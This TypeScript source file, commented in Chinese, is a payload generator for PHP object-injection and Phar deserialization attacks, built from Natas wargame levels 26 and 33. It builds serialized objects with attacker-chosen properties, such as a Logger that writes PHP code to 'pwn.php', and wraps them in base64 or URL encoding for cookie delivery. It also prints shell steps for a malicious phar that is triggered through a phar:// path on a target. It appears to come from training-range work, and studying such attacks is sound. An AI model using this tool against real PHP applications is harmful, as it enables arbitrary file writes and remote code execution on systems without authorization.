/**
 * PHP 反序列化/对象注入原语（cyber-range 经验固化）
 *
 * 经验来源（Natas 实战）：
 *  - natas26 PHP 对象注入：Cookie drawing 被 base64_decode+unserialize；Logger 类 logFile/exitMsg 可控
 *    + __destruct 写文件 → 构造序列化 Logger（private 属性 `\0ClassName\0propName`）
 *  - natas33 Phar 反序列化：Executor __destruct 校验 md5_file(filename)==signature 后 passthru；
 *    本地 php -d phar.readonly=0 构造 test.phar，metadata 序列化 Executor（signature=True 弱比较绕过）
 *  - 坑：private 属性名需 `\0ClassName\0prop`；protected 用 `\0*\0prop`；一次请求多处 unserialize
 *    会重复触发 __destruct → 用新文件名 + echo 包裹定位干净输出
 *
 * 设计：纯本地生成序列化串（PHP serialize 格式），不触网。
 */

export interface SerializeOptions {
  className: string
  /** 属性名 → 值；值需已是 PHP 序列化兼容形态（string/number/bool/嵌套对象由工具处理） */
  properties: Record<string, string | number | boolean>
  /** 可见性：public/private/protected（影响属性名编码） */
  visibility?: 'public' | 'private' | 'protected'
  /** base64 包装（natas26 cookie 场景） */
  base64?: boolean
  /** URL 编码（cookie 提交场景） */
  urlEncode?: boolean
}

function serializeValue(v: string | number | boolean): string {
  if (typeof v === 'boolean') return `b:${v ? 1 : 0};`
  if (typeof v === 'number') {
    if (Number.isInteger(v)) return `i:${v};`
    return `d:${v};`
  }
  return `s:${Buffer.byteLength(v, 'utf8')}:"${v}";`
}

/**
 * 生成 PHP serialize 格式对象串。
 * 例：O:6:"Logger":2:{s:16:"\0Logger\0logFile";s:4:"pwn.php";s:15:"\0Logger\0exitMsg";s:9:"<?php ...";}
 */
export function buildSerializedObject(opts: SerializeOptions): string {
  const cls = opts.className
  const vis = opts.visibility ?? 'private'
  const props = Object.entries(opts.properties)
  const body = props.map(([name, value]) => {
    let key: string
    if (vis === 'public') {
      key = name
    } else if (vis === 'protected') {
      key = `\0*\0${name}`
    } else {
      key = `\0${cls}\0${name}` // private：\0ClassName\0propName
    }
    const keyLen = Buffer.byteLength(key, 'utf8')
    return `s:${keyLen}:"${key}";${serializeValue(value)}`
  }).join('')
  return `O:${Buffer.byteLength(cls, 'utf8')}:"${cls}":${props.length}:{${body}}`
}

/** 生成 Phar 反序列化 payload 的构造步骤（本地 php 命令） */
export function buildPharMetadata(options: {
  classDef: string        // 目标类定义（如 Executor 带 __destruct）
  metadata: string        // 序列化 metadata（含对象的串）
  pharPath?: string
  triggerFile?: string
}): string {
  const phar = options.pharPath ?? '/tmp/test.phar'
  const trigger = options.triggerFile ?? 'pwn.php'
  return [
    `# 1. 构造 Phar（需 php + phar.readonly=0）：`,
    `php -d phar.readonly=0 <<'EOF'`,
    `<?php`,
    options.classDef,
    `@unlink('${phar}');`,
    `$p = new Phar('${phar}');`,
    `$p->startBuffering();`,
    `$p->setStub('<?php __HALT_COMPILER(); ?>');`,
    `$p->addFromString('${trigger}', '<?php echo "PWNED"; ?>');`,
    `$p->setMetadata(unserialize('${options.metadata}'));`,
    `$p->stopBuffering();`,
    `?>`,
    `EOF`,
    `# 2. 上传 ${phar} 与 ${trigger} 到目标，提交 filename=phar://${phar} 触发反序列化`,
  ].join('\n')
}

/** 生成一组 PHP 序列化原语 */
export function generateSerialize(opts: SerializeOptions & {
  pharClassDef?: string
  pharMetadata?: string
}): { serialized: string; ready: string; pharSteps?: string; notes: string[] } {
  const serialized = buildSerializedObject(opts)
  const ready = opts.base64
    ? Buffer.from(serialized, 'utf8').toString('base64')
    : serialized
  const final = opts.urlEncode ? encodeURIComponent(ready) : ready
  const notes: string[] = []
  if (opts.visibility === 'private') {
    notes.push('private 属性名需 \0ClassName\0propName（序列化串中的 \0 为字面空字节，构造时用 PHP 或转义保留）')
  }
  if (opts.base64) notes.push('已做 base64 包装（natas26 cookie 场景：unserialize(base64_decode($cookie)))')
  if (opts.urlEncode) notes.push('已 URL 编码（作为 cookie/参数提交时防特殊字符被破坏）')
  notes.push('多次 unserialize 会重复触发 __destruct → 用新文件名 + echo 包裹定位干净输出')
  const pharSteps = opts.pharClassDef && opts.pharMetadata
    ? buildPharMetadata({ classDef: opts.pharClassDef, metadata: opts.pharMetadata })
    : undefined
  return { serialized, ready: final, pharSteps, notes }
}